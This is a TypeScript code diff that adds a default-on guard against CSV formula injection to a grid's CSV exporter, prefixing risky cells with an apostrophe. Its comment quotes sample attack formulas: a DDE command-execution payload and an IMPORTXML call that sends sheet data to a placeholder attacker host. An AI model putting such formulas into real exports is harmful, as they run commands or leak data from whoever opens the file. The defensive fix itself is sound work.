@@ -12,19 +12,66 @@ export interface CsvOptions {
   bom?: boolean;
   /** Include the caption header row. Default true. */
   header?: boolean;
+  /**
+   * Neutralize cells a spreadsheet would evaluate as a formula. Default true —
+   * see {@link guardCsvFormula}. Set to `false` only when the exported data is
+   * trusted **and** the file is consumed by a parser rather than a spreadsheet.
+   */
+  formulaGuard?: boolean;
 }
 
-/** RFC 4180 quoting for a single CSV cell (shared with the pivot exporter). */
-export function escapeCsvCell(text: string, separator: string): string {
+/**
+ * Characters that make a spreadsheet read a text cell as a formula.
+ *
+ * `\t` and `\r` are in the list because Excel strips leading whitespace before
+ * it decides, so `\t=cmd|…` is a formula to Excel and a plain string to a
+ * naive check.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** A cell that is just a number — `-5`, `+3.1`, `1e9` — and so not a formula. */
+const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;
+
+/**
+ * Defuses CSV formula injection (CWE-1236).
+ *
+ * A CSV file is data, but Excel, LibreOffice and Google Sheets evaluate any
+ * cell that opens with `=`, `+`, `-` or `@`. A grid that exports rows a user
+ * typed therefore hands the next person to open the file a live formula —
+ * historically `=cmd|'/c calc'!A1` for DDE command execution, and still
+ * `=HYPERLINK(...)` or `=IMPORTXML("http://attacker/?"&A1)` to exfiltrate the
+ * sheet. The export is the injection point, so the export is where it is
+ * stopped.
+ *
+ * The fix is the one every spreadsheet honors: a leading apostrophe, which
+ * forces the cell to text and is not itself displayed. Numbers are left alone
+ * so a `-5` column stays numeric, which is the whole reason a blanket prefix
+ * is the wrong shape for this.
+ */
+export function guardCsvFormula(text: string): string {
+  if (!FORMULA_LEAD.test(text) || PLAIN_NUMBER.test(text)) return text;
+  return `'${text}`;
+}
+
+/**
+ * RFC 4180 quoting for a single CSV cell (shared with the pivot exporter).
+ * Pass `guardFormula: false` to skip the {@link guardCsvFormula} step.
+ */
+export function escapeCsvCell(
+  text: string,
+  separator: string,
+  guardFormula = true,
+): string {
+  const cell = guardFormula ? guardCsvFormula(text) : text;
   if (
-    text.includes(separator) ||
-    text.includes('"') ||
-    text.includes('\n') ||
-    text.includes('\r')
+    cell.includes(separator) ||
+    cell.includes('"') ||
+    cell.includes('\n') ||
+    cell.includes('\r')
   ) {
-    return `"${text.replace(/"/g, '""')}"`;
+    return `"${cell.replace(/"/g, '""')}"`;
   }
-  return text;
+  return cell;
 }
 
 /** Builds RFC 4180-style CSV output from rows + column definitions. */
@@ -34,11 +81,12 @@ export function buildCsv<T>(
   options: CsvOptions = {},
 ): string {
   const separator = options.separator ?? ',';
+  const guard = options.formulaGuard !== false;
   const lines: string[] = [];
   if (options.header !== false) {
     lines.push(
       columns
-        .map((column) => escapeCsvCell(column.caption, separator))
+        .map((column) => escapeCsvCell(column.caption, separator, guard))
         .join(separator),
     );
   }
@@ -53,7 +101,7 @@ export function buildCsv<T>(
               : column.format
                 ? column.format(value)
                 : String(value);
-          return escapeCsvCell(text, separator);
+          return escapeCsvCell(text, separator, guard);
         })
         .join(separator),
     );
